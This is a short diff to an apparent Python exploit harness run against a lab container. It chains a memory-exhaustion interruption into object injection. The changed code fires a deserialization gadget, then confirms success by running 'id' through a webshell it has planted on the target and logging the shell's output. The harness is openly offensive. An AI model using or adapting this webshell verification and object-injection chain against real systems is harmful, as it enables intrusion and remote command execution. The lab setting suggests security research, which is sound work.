@@ -236,7 +236,7 @@ def attempt(headroom: int, port: int, container: str) -> dict:
     res["file_len"] = len(data)
 
     try:
-        rep = lab.consume(sid)
+        rep = lab.consume(sid)      # fires the gadget (plain app response)
     except (ConnectionRefusedError, OSError) as e:
         res["outcome"] = "container-died"
         res["report"] = str(e)
@@ -247,9 +247,13 @@ def attempt(headroom: int, port: int, container: str) -> dict:
                 except OSError:
                     pass
         return res
-    res["report"] = rep
-    evil = "evil" in (rep.get("objects") or {})
-    res["hit"] = evil
+    # Verdict WITHOUT any target-side report: the consumer request fired
+    # the gadget, so the webshell on disk IS the proof - probe it.
+    shell = lab.probe_shell(port, "id")
+    res["hit"] = bool(shell)
+    if shell:
+        res["shell_out"] = shell.decode(errors="replace").strip()[:80]
+    res["report"] = {"raw": rep.get("raw", "")[:80]}
 
     # keep the file for inspection
     try:
@@ -300,7 +304,8 @@ def _main() -> int:
         res = attempt(hr, port, lab.CONTAINER)
         print(f"    { {k: v for k, v in res.items() if k not in ('report',)} }")
         if res.get("hit"):
-            print(f"\n[+] HIT on attempt {i}: {res['report']}")
+            print(f"\n[+] HIT on attempt {i}: "
+                  f"{res.get('shell_out', res.get('report'))}")
             print("=== STAGE2 RESULT: PASS (real OOM interruption -> "
                   "object injection) ===")
             return 0
